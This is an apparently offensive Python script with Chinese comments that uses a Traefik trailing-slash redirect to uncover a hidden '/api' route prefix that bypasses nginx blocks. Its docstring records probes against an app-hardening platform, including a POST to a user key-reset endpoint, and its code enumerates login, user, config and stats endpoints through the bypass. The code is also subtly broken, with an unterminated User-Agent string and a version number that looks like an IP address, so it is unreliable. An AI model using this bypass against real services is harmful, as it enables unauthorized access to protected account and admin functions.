#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
【手法】尾斜杠触发 Traefik 301 清理，泄露隐藏的第二个路由 BASE 前缀

== 原理 ==
nginx → Traefik → 应用 的转发链上，Traefik 会做路径尾斜杠清理并返回 301/307，
且 Location 头里会带上**它实际转发到的路径**。当站点同时挂了两个 BASE 前缀
（如 /apkprotect 与 /api 都指向同一后端）时，nginx 侧的拦截规则（405/403/deny）
往往只挂在其中一个分支，另一个分支就成了绕过通道。

== 实测证据（203.0.113.43 加固平台）==
GET /apkprotect/v1/check_must_login/    → 301  Location: /api/v1/check_must_login
GET /apkprotect/v1/check_must_login//   → 同上
POST /apkprotect/v6/web/users/1/reset_aksk/ → 307（清理后重发，证明该 POST 到达应用链）

nginx 管控差异：
PATCH  /apkprotect/v1/web/users                 → 405 Not Allowed   ← nginx location 拦
PATCH  /api/v1/web/users                        → 403 user not login ← 绕过 nginx，到达应用
POST   /apkprotect/v6/web/users/1/reset_aksk    → 403 user not login ← POST 未被 405 拦
"""
import sys, json
from curl_cffi import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36)


def probe(base, path, method="GET", body=None, hdr=None, follow=False):
    h = {"User-Agent": UA, "Origin": base, "Referer": base + "/"}
    if body is not None:
        h["Content-Type"] = "application/json;charset=UTF-8"
    if hdr:
        h.update(hdr)
    kw = {"data": json.dumps(body) if isinstance(body, dict) else body} if body is not None else {}
    r = requests.request(method, base + path, headers=h, timeout=13,
                         impersonate="chrome", verify=False,
                         allow_redirects=follow, **kw)
    return r.status_code, r.content, dict(r.headers)


def find_hidden_base(base, known="/apkprotect/v1/check_must_login"):
    """靠尾斜杠触发 301，从 Location 里读出另一个 BASE"""
    print("[*] 触发尾斜杠清理：", known + "/")
    sc, c, h = probe(base, known + "/")
    print("    [%s] Location=%s" % (sc, h.get("Location", "")))
    if sc in (301, 302, 307, 308) and h.get("Location"):
        newbase = h["Location"].rsplit("/", 3)[0]     # 取到 /api 或 /apkprotect 一级
        print("    ★ 发现隐藏 BASE: %s" % newbase)
        return newbase
    return None


if __name__ == "__main__":
    base = (sys.argv[1] if len(sys.argv) > 1 else "https://203.0.113.43").rstrip("/")
    nb = find_hidden_base(base)
    if nb:
        for p in ["/v1/check_must_login", "/v6/login_info", "/v1/logout",
                  "/v1/passport_login", "/v6/web/users", "/v5/configs/default",
                  "/v6/web/stats", "/v6/web/vendor/info"]:
            sc, c, h = probe(base, nb + p)
            print("    [%s] %-34s len=%-6d %r" % (sc, nb + p, len(c), c[:90]))
